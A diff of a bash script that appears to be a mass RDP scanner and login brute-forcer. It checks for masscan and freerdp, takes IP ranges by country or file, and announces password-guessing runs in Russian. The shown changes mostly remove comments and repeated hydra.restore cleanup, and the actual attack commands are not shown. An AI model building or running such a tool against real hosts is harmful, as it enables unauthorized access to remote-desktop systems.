@@ -1,7 +1,7 @@
 #!/bin/bash
 # NOTE: YOU ARE FREE TO COPY,MODIFY,REUSE THE SOURCE CODE FOR EDUCATIONAL PURPOSE ONLY.
 clear
-########################################COLOR_BASE####################################
+##########################################COLOR######################################
 colorbase="\E[0m"
 black="\033[1;30m"
 red="\033[1;31m"
@@ -12,8 +12,6 @@ grey="\033[1;37m"
 ##########################################CLEAR#######################################
 CLEARALL ()
 {
-#cat paused.conf | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
-
 rm -rf Results/ paused.conf list all_results 2> /dev/null
 }
 ########################################TESTROOT######################################
@@ -46,12 +44,10 @@ fi
 ######################################################################################
 CHECKDEPEND0 ()
 {
-#echo -e "                    $yellow*Проверяем зависимости.. Check dependencies"
 depend=$(dpkg -s masscan  | grep 'Status' | awk -F':' '/Status: / {print $2}')
 	if [ "$depend" = " install ok installed" ]; then
 		clear 
 			
-		#echo -e "                    $yellow*Проверяем зависимости.. Check dependencies$colorbase..OK"
 			else
 			echo ""
 		while true; do
@@ -68,12 +64,9 @@ fi
 ######################################################################################
 CHECKDEPEND ()
 {
-#echo -e "                    $yellow*Проверяем зависимости.. Check dependencies"
 depend=$(dpkg -s freerdp-x11 | grep 'Status' | awk -F':' '/Status: / {print $2}')
 	if [ "$depend" = " install ok installed" ]; then
 		clear 
-			
-		#echo -e "                    $yellow*Проверяем зависимости.. Check dependencies$colorbase..OK"
 			else
 			echo ""
 		while true; do
@@ -301,11 +294,6 @@ echo -e "$grey 204.$yellow Zimbabwe $colorbase";
 CLEARALL
 TESTROOT
 CHECKDISTR
-#echo -e "                    $yellow*Определяем язык...*Detect language"
-#sleep 1
-#clear
-#echo -e "                    $yellow*Определяем язык...*Detect language$colorbase..OK"
-#sleep 1
 CHECKDEPEND0
 CHECKDEPEND
 cat /etc/apt/sources.list_lazybak>/etc/apt/sources.list
@@ -359,7 +347,6 @@ echo "                           The port value was set $port"
 echo -e $red"                        The port value must be 0-65535"$colorbase
 exit;
 fi	
-#MENUENG
 fi
 }
 ######################################################################################################
@@ -446,11 +433,6 @@ else
 if [ "$menuoption" = "2" ]; then
 echo -e "$aquamarine*******************************************************************************$green"
 read -p "*Введите путь к файлу с диапазонами IP {list.txt,list..& etc.} : " listname
-#echo -e " $colorbase  +-----------------------------------------------------------------------+"   
-#echo -e "   |   $grey                            1.$yellow Nmap$colorbase                                 |";
-#echo -e "   |   $grey                            2.$yellow Masscan$colorbase                              |";
-#echo -e "   +-----------------------------------------------------------------------+"
-#read -p "                                Выберите сканер : " scan
 
 clear
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
@@ -497,9 +479,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 else
@@ -573,9 +553,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 else
@@ -642,9 +620,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 else
@@ -714,9 +690,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -786,9 +760,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 else
@@ -857,9 +829,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 else
@@ -929,9 +899,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 else
@@ -1000,9 +968,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 else
@@ -1070,9 +1036,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 else
@@ -1140,9 +1104,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -1211,9 +1173,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -1282,9 +1242,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -1353,9 +1311,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -1425,9 +1381,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -1497,9 +1451,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -1569,9 +1521,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -1641,9 +1591,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -1713,9 +1661,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -1785,9 +1731,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -1857,9 +1801,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -1929,9 +1871,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -2001,9 +1941,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -2072,9 +2010,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -2143,9 +2079,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -2214,9 +2148,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -2286,9 +2218,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -2357,9 +2287,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -2429,9 +2357,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -2501,9 +2427,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -2573,9 +2497,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -2645,9 +2567,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -2717,9 +2637,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -2789,9 +2707,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -2860,9 +2776,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -2932,9 +2846,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -3003,9 +2915,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -3074,9 +2984,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 else
@@ -3144,9 +3052,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -3216,9 +3122,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -3288,9 +3192,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -3360,9 +3262,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -3432,9 +3332,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -3504,9 +3402,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -3576,9 +3472,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -3648,9 +3542,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -3720,9 +3612,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -3792,9 +3682,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -3864,9 +3752,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -3936,9 +3822,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -4008,9 +3892,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -4080,9 +3962,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -4152,9 +4032,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -4224,9 +4102,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -4296,9 +4172,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -4368,9 +4242,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -4440,9 +4312,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -4512,9 +4382,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -4584,9 +4452,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -4656,9 +4522,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -4728,9 +4592,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -4800,9 +4662,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -4872,9 +4732,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -4944,9 +4802,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -5016,9 +4872,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -5087,9 +4941,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -5159,9 +5011,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -5231,9 +5081,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -5303,9 +5151,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -5375,9 +5221,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -5447,9 +5291,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -5519,9 +5361,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -5591,9 +5431,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -5663,9 +5501,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -5735,9 +5571,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -5807,9 +5641,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -5879,9 +5711,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -5951,9 +5781,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -6023,9 +5851,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -6095,9 +5921,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -6167,9 +5991,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -6239,9 +6061,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -6310,9 +6130,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -6381,9 +6199,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -6453,9 +6269,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -6525,9 +6339,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
